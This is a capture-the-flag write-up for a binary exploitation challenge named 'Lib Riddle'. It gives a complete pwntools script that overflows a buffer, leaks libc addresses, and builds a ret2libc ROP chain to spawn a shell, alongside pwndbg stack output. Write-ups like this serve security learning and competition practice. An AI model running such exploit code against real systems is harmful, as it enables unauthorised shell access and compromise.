# Lib Riddle 
Solved by **CapangJabba**

## Question
Welcome to Lib-Riddle, where the library holds a secret deep inside its stacks. In this hilarious and intriguing challenge, you'll sift through piles of books and quirky clues to uncover the hidden mystery. Can you crack the code and reveal the library's best-kept secret? Dive in and let the quest for knowledge begin!

## Solution
Exploit buffer overflow, overwrite return address to leak libc addresses. find the libc version at https://libc.rip/ . execute `ret2libc`

```
from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./challenge_patched", )
elf = context.binary = ELF("./challenge_patched", checksec=False)
context.log_level = 'info'

libc = ELF('./libc6_2.31-0ubuntu9.14_amd64.so')
ret = 0x000000000040101a
pop_rdi = p64(0x0000000000401273)
plt_puts = p64(elf.plt['puts'])
got_read = p64(elf.got['read'])
got_puts = p64(elf.got['puts'])
offset = 24

'''
pwndbg> tele rsp 30
00:0000│ rsi rsp 0x7fffffffdcb0 ◂— 'AAAABBBBCCCCDDDD\n'
01:0008│-008     0x7fffffffdcb8 ◂— 'CCCCDDDD\n'
02:0010│ rbp     0x7fffffffdcc0 ◂— 0xa /* '\n' */
03:0018│+008     0x7fffffffdcc8 —▸ 0x7ffff7decc8a (__libc_start_call_main+122) ◂— mov edi, eax
04:0020│+010     0x7fffffffdcd0 —▸ 0x7fffffffddc0 —▸ 0x7fffffffddc8 ◂— 0x38 /* '8' */
'''

io.recvuntil(b'name?\n')
payload = b'A'*24
payload += pop_rdi + got_puts + plt_puts
payload += pop_rdi + got_read + plt_puts
payload += p64(elf.sym['main'])
io.sendline(payload)
io.recvline()
io.recvline()
leak1 = unpack(io.recv(6).ljust(8,b'\x00'))
io.recvline()
leak2 = unpack(io.recv(6).ljust(8,b'\x00'))

# libc.address = leak - 0x27c8a
print(f"leak1: {hex(leak1)}")
print(f"leak2: {hex(leak2)}")

# print(f"libc.address: {hex(libc.address)}")


libc.address = leak1 - libc.sym['puts']
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = b'A'*24
payload += p64(ret)
payload += p64(ret)
payload += rop.chain()

io.sendline(payload)

io.interactive()
```

### Flag
`OSCTF{XXX}`
